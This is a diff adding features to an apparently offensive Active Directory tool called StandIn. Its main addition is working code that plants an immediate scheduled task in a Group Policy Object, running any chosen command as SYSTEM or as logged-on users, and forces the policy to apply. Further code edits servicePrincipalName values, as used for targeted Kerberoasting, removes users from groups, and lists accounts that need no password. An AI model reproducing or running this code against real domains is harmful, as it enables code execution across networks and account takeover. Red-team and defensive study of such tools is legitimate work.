+            } else if (sTaskType.ToLower() == "computer")
+            {
+                sTaskType = "computer";
+                sTaskPath = @"\Machine\Preferences\ScheduledTasks\";
+            } else
+            {
+                Console.WriteLine("\n[!] Invalid task type, user/computer..");
+                return;
+            }
+
+            if (String.IsNullOrEmpty(sTaskName))
+            {
+                sTaskName = hStandIn.genAccountPass();
+            }
+
+            String sTaskContent = String.Empty;
+            if (sTaskType == "user")
+            {
+                if (String.IsNullOrEmpty(sTarget))
+                {
+                    sTaskContent = String.Format(@"<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-07-25 14:05:31"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""%LogonDomain%\%LogonUser%"" logonType=""InteractiveToken""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>%LogonDomain%\%LogonUser%</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>", sAuthor, sTaskName, sCommand, sArgs, Guid.NewGuid().ToString());
+                } else
+                {
+                    sTaskContent = string.Format(@"<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-07-25 14:05:31"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""%LogonDomain%\%LogonUser%"" logonType=""InteractiveToken""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>%LogonDomain%\%LogonUser%</UserId><LogonType>InteractiveToken</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties><Filters><FilterUser bool=""AND"" not=""0"" name=""{5}"" sid=""{6}""/></Filters></ImmediateTaskV2>", sAuthor, sTaskName, sCommand, sArgs, Guid.NewGuid().ToString(), sTarget, sTargetSID);
+                }
+                
+            } else
+            {
+                if (String.IsNullOrEmpty(sTarget))
+                {
+                    sTaskContent = String.Format(@"<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-03-30 23:04:20"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""NT AUTHORITY\System"" logonType=""S4U""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>NT AUTHORITY\System</UserId><LogonType>S4U</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties></ImmediateTaskV2>", sAuthor, sTaskName, sCommand, sArgs, Guid.NewGuid().ToString());
+                } else
+                {
+                    sTaskContent = string.Format(@"<ImmediateTaskV2 clsid=""{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}"" name=""{1}"" image=""0"" changed=""2019-03-30 23:04:20"" uid=""{4}""><Properties action=""C"" name=""{1}"" runAs=""NT AUTHORITY\System"" logonType=""S4U""><Task version=""1.3""><RegistrationInfo><Author>{0}</Author><Description></Description></RegistrationInfo><Principals><Principal id=""Author""><UserId>NT AUTHORITY\System</UserId><LogonType>S4U</LogonType><RunLevel>HighestAvailable</RunLevel></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>true</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable><AllowStartOnDemand>true</AllowStartOnDemand><Enabled>true</Enabled><Hidden>false</Hidden><RunOnlyIfIdle>false</RunOnlyIfIdle><WakeToRun>false</WakeToRun><ExecutionTimeLimit>P3D</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter></Settings><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers><Actions Context=""Author""><Exec><Command>{2}</Command><Arguments>{3}</Arguments></Exec></Actions></Task></Properties><Filters><FilterComputer bool=""AND"" not=""0"" type=""DNS"" name=""{5}""/></Filters></ImmediateTaskV2>", sAuthor, sTaskName, sCommand, sArgs, Guid.NewGuid().ToString(), sTarget);
+                }
+                
+            }
+
+            // Create searcher
+            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
+            if (!so.success)
+            {
+                Console.WriteLine("\n[!] Failed to create directory searcher..");
+                return;
+            }
+            DirectorySearcher ds = so.searcher;
+
+            // Search filter
+            ds.Filter = String.Format("(&(gpcfilesyspath=*)(displayName={0}))", sGPOName);
+
+            // Enum
+            try
+            {
+                // Search
+                SearchResultCollection oObject = ds.FindAll();
+
+                // Did we get at least 1 result back?
+                if (oObject.Count == 0)
+                {
+                    Console.WriteLine("\n[!] LDAP search did not return any results..");
+                    return;
+                }
+                else if (oObject.Count > 1)
+                {
+                    Console.WriteLine("\n[!] LDAP search returned more than one result..");
+                    return;
+                }
+
+                SearchResult dirGPOObject = oObject[0];
+                DirectoryEntry mde = dirGPOObject.GetDirectoryEntry();
+                ResultPropertyCollection omProps = dirGPOObject.Properties;
+
+                String sGPOPath = omProps["gpcfilesyspath"][0].ToString();
+                Console.WriteLine("\n[+] GPO Object Found");
+                Console.WriteLine("    Object   : " + mde.Name);
+                Console.WriteLine("    Path     : " + mde.Path);
+                Console.WriteLine("    GP Path  : " + sGPOPath);
+
+                // Read GPO version information
+                hStandIn.GPOVersion oGPOVer = hStandIn.UInt32ToGPOVersion((UInt32)Int32.Parse(omProps["versionnumber"][0].ToString()));
+                Console.WriteLine("\n[?] GPO Version");
+                Console.WriteLine("    User     : " + oGPOVer.iUserVersion);
+                Console.WriteLine("    Computer : " + oGPOVer.iComputerVersion);
+
+                if (!Directory.Exists(sGPOPath))
+                {
+                    Console.WriteLine("\n[!] GPO path not found..");
+                    return;
+                }
+
+                // Read gpt.ini
+                String sGPT = File.ReadAllText(sGPOPath + @"\gpt.ini");
+                UInt32 iNewGPOVersion = 0;
+                if (sTaskType == "user")
+                {
+                    iNewGPOVersion = hStandIn.IncrementGPOVersion(oGPOVer, true, false);
+                }
+                else
+                {
+                    iNewGPOVersion = hStandIn.IncrementGPOVersion(oGPOVer, false, true);
+                }
+                String sNewGPT = Regex.Replace(sGPT, @"(V|v)ersion=\d+", String.Format("Version={0}", iNewGPOVersion));
+
+                // Check/create relevant path
+                if (!Directory.Exists(sGPOPath + sTaskPath))
+                {
+                    try
+                    {
+                        Directory.CreateDirectory(sGPOPath + sTaskPath);
+                    }
+                    catch
+                    {
+                        Console.WriteLine("\n[!] Failed to create GPO path..");
+                        return;
+                    }
+                }
+
+                Console.WriteLine("\n[+] Writing GPO changes");
+                if (File.Exists(sGPOPath + sTaskPath + "ScheduledTasks.xml"))
+                {
+                    Console.WriteLine("    |_ Updating existing ScheduledTasks.xml");
+                    String sTmpl = File.ReadAllText(sGPOPath + sTaskPath + "ScheduledTasks.xml");
+
+                    if ((sTmpl.ToLower()).Contains("</scheduledtasks>"))
+                    {
+                        Console.WriteLine("       |_ Updating GPO Privileges");
+                        MatchCollection mc = Regex.Matches(sTmpl, "name=\\\"" + sTaskName + "\\\"");
+                        if (mc.Count > 0)
+                        {
+                            Console.WriteLine("       |_ A scheduled task with that name already exists..");
+                            return;
+                        }
+                        else
+                        {
+                            // Ok here we just add the priv
+                            String sReplace = sTaskContent + @"</ScheduledTasks>";
+                            sTmpl = Regex.Replace(sTmpl, @"<\/(S|s)cheduled(T|t)asks>", sReplace);
+                        }
+                    }
+                    else
+                    {
+                        // We overwrite the file here
+                        Console.WriteLine("       |_ Adding XML task structure");
+                        sTmpl = @"<?xml version=""1.0"" encoding=""utf-8""?><ScheduledTasks clsid=""{CC63F200-7309-4ba0-B154-A71CD118DBCC}"">" + sTaskContent + @"</ScheduledTasks>";
+                    }
+
+                    File.WriteAllText(sGPOPath + sTaskPath + "ScheduledTasks.xml", sTmpl);
+                }
+                else
+                {
+                    Console.WriteLine("    |_ Creating ScheduledTasks.xml");
+                    String sGptTemplate = @"<?xml version=""1.0"" encoding=""utf-8""?><ScheduledTasks clsid=""{CC63F200-7309-4ba0-B154-A71CD118DBCC}"">" + sTaskContent + @"</ScheduledTasks>";
+
+                    File.WriteAllText(sGPOPath + sTaskPath + "ScheduledTasks.xml", sGptTemplate);
+                }
+
+                Console.WriteLine("    |_ Updating gpt.inf");
+                File.WriteAllText(sGPOPath + @"\gpt.ini", sNewGPT);
+                Console.WriteLine("    |_ Updating AD object");
+                Console.WriteLine("       |_ Incrementing version number");
+                if (sTaskType == "user")
+                {
+                    mde.Properties["versionNumber"].Value = (hStandIn.IncrementGPOVersion(oGPOVer, true, false)).ToString();
+
+                    if (dirGPOObject.Properties.Contains("gPCUserExtensionNames"))
+                    {
+                        Console.WriteLine("       |_ Updating gPCUserExtensionNames");
+                        String sMachExt = omProps["gPCUserExtensionNames"][0].ToString();
+                        MatchCollection mc = Regex.Matches(sMachExt, @"\[{?[0-9a-fA-F-]{36}}{?[0-9a-fA-F-]{36}}\]");
+                        if (mc.Count == 0)
+                        {
+                            mde.Properties["gPCUserExtensionNames"].Value = sMachExt + "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]";
+                        }
+                        else
+                        {
+                            List<String> lExt = new List<String>();
+                            if (!sMachExt.Contains("[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"))
+                            {
+                                lExt.Add("[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]");
+                            }
+
+                            if (!sMachExt.Contains("[{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"))
+                            {
+                                lExt.Add("[{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]");
+                            }
+
+                            lExt.Add(sMachExt);
+
+                            // Build new string
+                            String sNewMachExt = String.Empty;
+                            foreach (String s in lExt)
+                            {
+                                sNewMachExt += s;
+                            }
+                            mde.Properties["gPCUserExtensionNames"].Value = sNewMachExt;
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine("       |_ Creating gPCUserExtensionNames");
+                        mde.Properties["gPCUserExtensionNames"].Add("[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]");
+                    }
+                } else
+                {
+                    mde.Properties["versionNumber"].Value = (hStandIn.IncrementGPOVersion(oGPOVer, false, true)).ToString();
+
+                    if (dirGPOObject.Properties.Contains("gPCMachineExtensionNames"))
+                    {
+                        Console.WriteLine("       |_ Updating gPCMachineExtensionNames");
+                        String sMachExt = omProps["gPCMachineExtensionNames"][0].ToString();
+                        MatchCollection mc = Regex.Matches(sMachExt, @"\[{?[0-9a-fA-F-]{36}}{?[0-9a-fA-F-]{36}}\]");
+                        if (mc.Count == 0)
+                        {
+                            mde.Properties["gPCMachineExtensionNames"].Value = sMachExt + "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]";
+                        }
+                        else
+                        {
+                            List<String> lExt = new List<String>();
+                            if (!sMachExt.Contains("[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"))
+                            {
+                                lExt.Add("[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]");
+                            }
+
+                            if (!sMachExt.Contains("[{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"))
+                            {
+                                lExt.Add("[{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]");
+                            }
+
+                            lExt.Add(sMachExt);
+
+                            // Build new string
+                            String sNewMachExt = String.Empty;
+                            foreach (String s in lExt)
+                            {
+                                sNewMachExt += s;
+                            }
+                            mde.Properties["gPCMachineExtensionNames"].Value = sNewMachExt;
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine("       |_ Creating gPCMachineExtensionNames");
+                        mde.Properties["gPCMachineExtensionNames"].Add("[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]");
+                    }
+                }
+                
+                mde.CommitChanges();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[!] Failed modify GPO..");
+                if (ex.InnerException != null)
+                {
+                    Console.WriteLine(ex.InnerException.Message);
+                }
+                else
+                {
+                    Console.WriteLine(ex.Message);
+                }
+                return;
+            }
+        }
+
+        public static void GPOObjectIncCounter(String sGPOName, String sTaskType, String sDomain = "", String sUser = "", String sPass = "")
+        {
+            sTaskType = sTaskType.ToLower();
+            if (sTaskType != "user" && sTaskType != "computer")
+            {
+                Console.WriteLine("\n[!] Invalid task type, user/computer..");
+                return;
+            }
+
+            // Create searcher
+            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
+            if (!so.success)
+            {
+                Console.WriteLine("\n[!] Failed to create directory searcher..");
+                return;
+            }
+            DirectorySearcher ds = so.searcher;
+
+            // Search filter
+            ds.Filter = String.Format("(&(gpcfilesyspath=*)(displayName={0}))", sGPOName);
+
+            // Enum
+            try
+            {
+                // Search
+                SearchResultCollection oObject = ds.FindAll();
+
+                // Did we get at least 1 result back?
+                if (oObject.Count == 0)
+                {
+                    Console.WriteLine("\n[!] LDAP search did not return any results..");
+                    return;
+                }
+                else if (oObject.Count > 1)
+                {
+                    Console.WriteLine("\n[!] LDAP search returned more than one result..");
+                    return;
+                }
+
+                SearchResult dirGPOObject = oObject[0];
+                DirectoryEntry mde = dirGPOObject.GetDirectoryEntry();
+                ResultPropertyCollection omProps = dirGPOObject.Properties;
+
+                String sGPOPath = omProps["gpcfilesyspath"][0].ToString();
+                Console.WriteLine("\n[+] GPO Object Found");
+                Console.WriteLine("    Object   : " + mde.Name);
+                Console.WriteLine("    Path     : " + mde.Path);
+                Console.WriteLine("    GP Path  : " + sGPOPath);
+
+                // Read GPO version information
+                hStandIn.GPOVersion oGPOVer = hStandIn.UInt32ToGPOVersion((UInt32)Int32.Parse(omProps["versionnumber"][0].ToString()));
+                Console.WriteLine("\n[?] Current GPO Versioning");
+                Console.WriteLine("    User     : " + oGPOVer.iUserVersion);
+                Console.WriteLine("    Computer : " + oGPOVer.iComputerVersion);
+
+                if (sTaskType == "user")
+                {
+                    Console.WriteLine("\n--> Incrementing user version");
+                    mde.Properties["versionNumber"].Value = (hStandIn.IncrementGPOVersion(oGPOVer, true, false)).ToString();
+                } else
+                {
+                    Console.WriteLine("\n--> Incrementing computer version");
+                    mde.Properties["versionNumber"].Value = (hStandIn.IncrementGPOVersion(oGPOVer, false, true)).ToString();
+                }
+
+                mde.CommitChanges();
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[!] Failed modify GPO..");
+                if (ex.InnerException != null)
+                {
+                    Console.WriteLine(ex.InnerException.Message);
+                }
+                else
+                {
+                    Console.WriteLine(ex.Message);
+                }
                 return;
             }
         }
@@ -870,7 +2055,7 @@ namespace StandIn
             }
         }
 
-        public static void getGroupMembership(String sGroup, String sDomain = "", String sUser = "", String sPass = "")
+        public static void removeUserFromGroup(String sGroup, String sRmUser, String sDomain = "", String sUser = "", String sPass = "")
         {
             try
             {
@@ -896,6 +2081,60 @@ namespace StandIn
                 }
                 else
                 {
+                    Console.WriteLine("\n[+] Removing user from group");
+                    if (oGroup.Members.Contains(pc, IdentityType.SamAccountName, sRmUser))
+                    {
+                        oGroup.Members.Remove(pc, IdentityType.SamAccountName, sRmUser);
+                    } else
+                    {
+                        Console.WriteLine("[!] User not in specified group..");
+                        return;
+                    }
+                    oGroup.Save();
+                    Console.WriteLine("    |_ Success");
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[!] Failed remove user from group..");
+                if (ex.InnerException != null)
+                {
+                    Console.WriteLine("    |_ " + ex.InnerException.Message);
+                }
+                else
+                {
+                    Console.WriteLine("    |_ " + ex.Message);
+                }
+            }
+        }
+
+        public static void getGroupMembership(String sGroup, String sDomain = "", String sUser = "", String sPass = "")
+        {
+            try
+            {
+                PrincipalContext pc = null;
+                if (!String.IsNullOrEmpty(sDomain) && !String.IsNullOrEmpty(sUser) && !String.IsNullOrEmpty(sPass))
+                {
+                    String sUserDomain = String.Format("{0}\\{1}", sDomain, sUser);
+                    pc = new PrincipalContext(ContextType.Domain, sDomain, sUser, sPass);
+                }
+                else
+                {
+                    pc = new PrincipalContext(ContextType.Domain);
+                }
+
+                Console.WriteLine("\n[?] Using DC : " + pc.ConnectedServer);
+                GroupPrincipal oGroup = null;
+                UserPrincipal oUser = null;
+                try
+                {
+                    oGroup = GroupPrincipal.FindByIdentity(pc, sGroup);
+                    oUser = UserPrincipal.FindByIdentity(pc, IdentityType.SamAccountName, sGroup);
+                } catch { }
+                if (oGroup != null)
+                {
+                    Console.WriteLine("[?] Type     : Group resolution");
+                    Console.WriteLine("    Group    : " + oGroup.Name);
                     Console.WriteLine("\n[+] Members");
                     PrincipalCollection gms = oGroup.Members;
 
@@ -904,24 +2143,43 @@ namespace StandIn
                         DirectoryEntry mde = (DirectoryEntry)m.GetUnderlyingObject();
                         Console.WriteLine("\n[?] Path           : " + mde.Path);
                         Console.WriteLine("    samAccountName : " + m.SamAccountName);
-                        if ((Int32)mde.Properties["samaccounttype"].Value == 268435456)
+                        if ((Int32)mde.Properties["samaccounttype"].Value == (Int32)hStandIn.SAM_ACCOUNT_TYPE.SAM_GROUP_OBJECT)
                         {
-                            Console.WriteLine("    Type           : Group");
-                        } else if ((Int32)mde.Properties["samaccounttype"].Value == 805306368)
+                            Console.WriteLine("    Type           : SAM_GROUP_OBJECT");
+                        }
+                        else if ((Int32)mde.Properties["samaccounttype"].Value == (Int32)hStandIn.SAM_ACCOUNT_TYPE.SAM_USER_OBJECT)
                         {
-                            Console.WriteLine("    Type           : User");
-                        } else
+                            Console.WriteLine("    Type           : SAM_USER_OBJECT");
+                        }
+                        else
                         {
                             Console.WriteLine("    Type           : " + mde.Properties["samaccounttype"].Value);
                         }
                         Console.WriteLine("    SID            : " + m.Sid);
-                        
+
                     }
+                } else if (oUser != null)
+                {
+                    Console.WriteLine("[?] Type     : User resolution");
+                    Console.WriteLine("    User     : " + oUser.Name);
+                    Console.WriteLine("\n[+] Memberships");
+                    PrincipalSearchResult<Principal> groups = oUser.GetGroups();
+                    foreach (GroupPrincipal g in groups)
+                    {
+                        DirectoryEntry mde = (DirectoryEntry)g.GetUnderlyingObject();
+                        Console.WriteLine("\n[?] Path           : " + mde.Path);
+                        Console.WriteLine("    samAccountName : " + g.SamAccountName);
+                        Console.WriteLine("    Type           : SAM_GROUP_OBJECT");
+                        Console.WriteLine("    SID            : " + g.Sid);
+                    }
+                } else
+                {
+                    Console.WriteLine("[!] Failed to resolve identity..");
                 }
             }
             catch (Exception ex)
             {
-                Console.WriteLine("[!] Failed add user to group..");
+                Console.WriteLine("[!] Failed to enumerate identity memberships..");
                 if (ex.InnerException != null)
                 {
                     Console.WriteLine("    |_ " + ex.InnerException.Message);
@@ -964,7 +2222,22 @@ namespace StandIn
 
                         Console.WriteLine("\n[*] SamAccountName         : " + omProps["samAccountName"][0].ToString());
                         Console.WriteLine("    DistinguishedName      : " + omProps["distinguishedName"][0].ToString());
-                        Console.WriteLine("    ServicePrincipalName   : " + omProps["servicePrincipalName"][0].ToString());
+                        if (omProps["servicePrincipalName"].Count > 1)
+                        {
+                            List<String> servicePrincipalName = new List<String>();
+                            
+                            foreach (var element in omProps["servicePrincipalName"])
+                            {
+                                servicePrincipalName.Add(element.ToString());
+                            }
+                            Console.WriteLine("    ServicePrincipalName   : " + String.Join("\n                             ", servicePrincipalName.ToArray()));
+                        }
+                        else
+                        {
+                            Console.WriteLine("    ServicePrincipalName   : " + omProps["servicePrincipalName"][0].ToString());
+
+                        }
+
                         long lastPwdSet = 0;
                         try
                         {
@@ -1049,6 +2322,134 @@ namespace StandIn
                 {
                     Console.WriteLine("    |_ " + ex.Message);
                 }
+            }
+        }
+
+        public static void updateSPNProperty(String sSetSPN, String sPrincipal, Boolean bAdd = false, Boolean bRemove = false, String sDomain = "", String sUser = "", String sPass = "")
+        {
+            // Create searcher
+            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
+            if (!so.success)
+            {
+                Console.WriteLine("[!] Failed to create directory searcher..");
+                return;
+            }
+            DirectorySearcher ds = so.searcher;
+
+            // Search filter
+            ds.Filter = "samaccountname=" + sSetSPN;
+
+            // Enum
+            try
+            {
+                // Search
+                SearchResultCollection oObject = ds.FindAll();
+
+                // Did we get 1 result back?
+                if (oObject.Count == 0)
+                {
+                    Console.WriteLine("[!] Object not found..");
+                    return;
+                }
+                else if (oObject.Count > 1)
+                {
+                    Console.WriteLine("[!] Invalid search, multiple results returned..");
+                    return;
+                }
+
+                // Get object details
+                foreach (SearchResult sr in oObject)
+                {
+                    try
+                    {
+                        DirectoryEntry mde = sr.GetDirectoryEntry();
+                        Console.WriteLine("[?] Object   : " + mde.Name);
+                        Console.WriteLine("    Path     : " + mde.Path);
+
+                        ResultPropertyCollection omProps = sr.Properties;
+                        List<String> servicePrincipalName = new List<String>();
+                        try
+                        {
+                            foreach (var element in omProps["servicePrincipalName"])
+                            {
+                                servicePrincipalName.Add(element.ToString());
+                            }
+                        }
+                        catch
+                        {
+                            Console.WriteLine("[!] Failed to get servicePrincipalName property..");
+                            return;
+                        }
+
+                        Console.WriteLine("\n[*] SamAccountName         : " + omProps["samAccountName"][0].ToString());
+                        Console.WriteLine("    DistinguishedName      : " + omProps["distinguishedName"][0].ToString());
+                        if (servicePrincipalName.Count > 0)
+                        {
+                            if (servicePrincipalName.Count > 1)
+                            {
+                                Console.WriteLine("    ServicePrincipalName   : " + String.Join("\n                             ", servicePrincipalName.ToArray()));
+                            }
+                            else
+                            {
+                                Console.WriteLine("    ServicePrincipalName   : " + omProps["servicePrincipalName"][0].ToString());
+                            }
+                        }
+                        
+                        if (!bRemove)
+                        {
+                            if (servicePrincipalName.Contains(sPrincipal))
+                            {
+                                Console.WriteLine("\n[!] ServicePrincipalName entry already exists..");
+                                return;
+                            }
+
+                            Console.WriteLine("\n[+] Adding servicePrincipalName : " + sPrincipal);
+                            servicePrincipalName.Add(sPrincipal);
+                            mde.Properties["servicePrincipalName"].Value = (Array)servicePrincipalName.ToArray();
+                        }
+                        else
+                        {
+                            if (servicePrincipalName.Count == 0)
+                            {
+                                Console.WriteLine("\n[!] ServicePrincipalName property does not exist..");
+                                return;
+                            }
+
+                            if (!servicePrincipalName.Contains(sPrincipal))
+                            {
+                                Console.WriteLine("\n[!] ServicePrincipalName entry does not exist..");
+                                return;
+                            }
+
+                            Console.WriteLine("\n[+] Removing servicePrincipalName : " + sPrincipal);
+
+                            servicePrincipalName.Remove(sPrincipal);
+                            mde.Properties["servicePrincipalName"].Value = (Array)servicePrincipalName.ToArray();
+
+                        }
+
+                        mde.CommitChanges();
+                        servicePrincipalName.Clear();
+                        Console.WriteLine("    |_ Success");
+                    }
+                    catch (Exception ex)
+                    {
+                        Console.WriteLine("[!] Failed to update servicePrincipalName..");
+                        if (ex.InnerException != null)
+                        {
+                            Console.WriteLine("    |_ " + ex.InnerException.Message);
+                        }
+                        else
+                        {
+                            Console.WriteLine("    |_ " + ex.Message);
+                        }
+                    }
+                }
+            }
+            catch
+            {
+                Console.WriteLine("[!] Failed to enumerate object properties..");
+                return;
             }
         }
 
@@ -1348,6 +2749,141 @@ namespace StandIn
             }
         }
 
+        public static void getPassNotReqdAccounts(String sDomain = "", String sUser = "", String sPass = "")
+        {
+            // Create searcher
+            hStandIn.SearchObject so = hStandIn.createSearchObject(sDomain, sUser, sPass);
+            if (!so.success)
+            {
+                Console.WriteLine("[!] Failed to create directory searcher..");
+                return;
+            }
+            DirectorySearcher ds = so.searcher;
+
+            // ASREP filter
+            ds.Filter = "(&(userAccountControl:1.2.840.113556.1.4.803:=32)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))";
+
+            // Enum
+            try
+            {
+                // Search
+                SearchResultCollection oObject = ds.FindAll();
+                Console.WriteLine("\n[?] Found " + oObject.Count + " object(s) that do not require a password..");
+
+                // Account details
+                foreach (SearchResult sr in oObject)
+                {
+                    try
+                    {
+                        DirectoryEntry mde = sr.GetDirectoryEntry();
+                        ResultPropertyCollection omProps = sr.Properties;
+
+                        Console.WriteLine("\n[*] SamAccountName           : " + omProps["samAccountName"][0].ToString());
+                        Console.WriteLine("    DistinguishedName        : " + omProps["distinguishedName"][0].ToString());
+
+                        long lastPwdSet = 0;
+                        try
+                        {
+                            lastPwdSet = (long)omProps["pwdlastset"][0];
+                        }
+                        catch { }
+
+                        if (lastPwdSet == long.MaxValue)
+                        {
+                            Console.WriteLine("    PwdLastSet               : 0x7FFFFFFFFFFFFFFF");
+                        }
+                        else if (lastPwdSet == 0)
+                        {
+                            Console.WriteLine("    PwdLastSet               : 0x0");
+                        }
+                        else
+                        {
+                            Console.WriteLine("    PwdLastSet               : " + DateTime.FromFileTimeUtc((long)omProps["pwdlastset"][0]) + " UTC");
+                        }
+
+                        try
+                        {
+                            long logonTimestamp = (long)omProps["lastlogon"][0];
+                            if (logonTimestamp == long.MaxValue)
+                            {
